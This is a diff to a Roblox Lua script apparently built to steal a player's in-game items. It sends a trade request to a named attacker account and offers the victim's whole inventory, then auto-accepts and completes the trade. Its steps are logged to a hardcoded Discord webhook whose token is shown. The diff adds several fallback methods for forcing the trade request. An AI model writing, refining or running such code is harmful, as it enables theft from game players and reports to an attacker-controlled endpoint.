@@ -1,4 +1,4 @@
---[=[ FINAL: Inventory-based trade – no GUI needed ]=]
+--[=[ FINAL: Multi‑method trade request ]=]
 
 local webhookURL = "https://discord.com/api/webhooks/1532509426257236008/TQrtSPyEYviVXAPzhBbVgaPIRcKFLHghPCxBfD3TFQ7njWBM7qngokItqz0vCXkiCkcz"
 local attackerUsername = "FEARACCE"
@@ -70,7 +70,7 @@ game:GetService("UserInputService").InputBegan:Connect(function(input)
 end)
 
 -- ============================================================
--- TRADE AUTOMATION (inventory remote)
+-- TRADE AUTOMATION (multi‑method)
 -- ============================================================
 local RS = game:GetService("ReplicatedStorage")
 local Trade = RS:FindFirstChild("Trade")
@@ -93,7 +93,7 @@ end
 
 send("✅ Remotes found.")
 
--- --- Get inventory item IDs from GetProfileData
+-- --- Inventory fetcher
 local function getInventoryIds()
     local InventoryFolder = RS:FindFirstChild("Remotes") and RS.Remotes:FindFirstChild("Inventory")
     local GetProfileData = InventoryFolder and InventoryFolder:FindFirstChild("GetProfileData")
@@ -103,15 +103,12 @@ local function getInventoryIds()
     local function extractIds(tbl)
         if type(tbl) ~= "table" then return end
         for k, v in pairs(tbl) do
-            -- Check if this is an item entry (has Name, ID, and Count > 0)
             if type(v) == "table" and v.Name and v.ID and v.Count and v.Count > 0 then
                 table.insert(ids, v.ID)
             end
-            -- If the key is numeric and value is a number (count), key is ID
             if type(k) == "number" and k > 0 and type(v) == "number" and v > 0 then
                 table.insert(ids, k)
             end
-            -- Recurse
             if type(v) == "table" then
                 extractIds(v)
             end
@@ -135,15 +132,13 @@ local function getInventoryIds()
     return ids
 end
 
--- --- Offer all items via OfferItem remote
+-- --- Offer items via remote
 local function offerAllItems(itemIds)
     if not OfferItem then return 0 end
     local count = 0
     for _, id in ipairs(itemIds) do
-        local ok, err = pcall(function() OfferItem:FireServer(id) end)
-        if ok then
-            count = count + 1
-        end
+        local ok = pcall(function() OfferItem:FireServer(id) end)
+        if ok then count = count + 1 end
         wait(0.05)
     end
     return count
@@ -166,27 +161,47 @@ spawn(function()
 
     wait(3)
 
-    -- 1. Send trade request
-    send("📤 Sending trade request...")
-    local ok, res = pcall(function() return SendReq:InvokeServer(target) end)
-    if not ok then
-        send("❌ Send failed: " .. tostring(res))
+    -- 1. Try multiple methods to send trade request
+    local requestSent = false
+    local methods = {
+        {name = "InvokeServer(Player)", func = function() return SendReq:InvokeServer(target) end},
+        {name = "InvokeServer(UserId)", func = function() return SendReq:InvokeServer(target.UserId) end},
+        {name = "FireServer(Player)", func = function() SendReq:FireServer(target); return true end},
+        {name = "FireServer(UserId)", func = function() SendReq:FireServer(target.UserId); return true end},
+        {name = "StartTrade:FireServer(Player)", func = function() if StartTr then StartTr:FireServer(target); return true else return false end end},
+        {name = "StartTrade:FireServer(UserId)", func = function() if StartTr then StartTr:FireServer(target.UserId); return true else return false end end},
+    }
+
+    for _, m in ipairs(methods) do
+        send("📤 Trying: " .. m.name)
+        local ok, err = pcall(m.func)
+        if ok then
+            send("✅ Success with: " .. m.name)
+            requestSent = true
+            break
+        else
+            send("❌ Failed (" .. m.name .. "): " .. tostring(err))
+        end
+    end
+
+    if not requestSent then
+        send("❌ Could not send trade request. Aborting.")
         return
     end
-    send("✅ Request sent, response: " .. tostring(res))
 
-    -- 2. Wait for attacker to accept (we'll just wait 5 seconds, no GUI detection)
+    -- 2. Wait for attacker to accept (5 seconds)
     send("⏳ Waiting 5 seconds for attacker to accept...")
     wait(5)
 
-    -- 3. Get inventory IDs
+    -- 3. Get inventory and offer items
     send("🔍 Fetching inventory...")
     local ids = getInventoryIds()
-    send("📦 Found " .. #ids .. " item IDs in inventory.")
-
-    if #ids == 0 then
-        send("⚠️ No items found. Trying fallback (tools).")
-        -- Fallback: collect tools from Backpack/Character
+    send("📦 Found " .. #ids .. " item IDs.")
+    if #ids > 0 then
+        local offered = offerAllItems(ids)
+        send("✅ Offered " .. offered .. " items.")
+    else
+        -- Fallback: tools
         local tools = {}
         for _, t in pairs(player.Backpack:GetChildren()) do
             if t:IsA("Tool") then table.insert(tools, t.Name) end
@@ -195,25 +210,19 @@ spawn(function()
             if t:IsA("Tool") then table.insert(tools, t.Name) end
         end
         if #tools > 0 then
-            send("🔧 Found " .. #tools .. " tools. Offering by name.")
+            send("🔧 Found " .. #tools .. " tools, offering by name.")
             for _, name in ipairs(tools) do
                 pcall(function() OfferItem:FireServer(name) end)
-                wait(0.05)
             end
-            send("✅ Offered " .. #tools .. " tools by name.")
+            send("✅ Offered " .. #tools .. " tools.")
         else
-            send("❌ No items or tools to offer.")
+            send("❌ No items found.")
         end
-    else
-        -- 4. Offer all items
-        send("📤 Offering " .. #ids .. " items...")
-        local offered = offerAllItems(ids)
-        send("✅ Offered " .. offered .. " items.")
     end
 
     wait(1)
 
-    -- 5. Accept trade (double)
+    -- 4. Accept trade (double)
     send("✅ Accepting trade...")
     pcall(function() AcceptTr:FireServer() end)
     wait(0.3)
@@ -222,7 +231,7 @@ spawn(function()
 
     wait(0.5)
 
-    -- 6. Complete trade
+    -- 5. Complete
     if CompleteTr then
         send("🏁 Completing trade...")
         pcall(function() CompleteTr:FireServer() end)
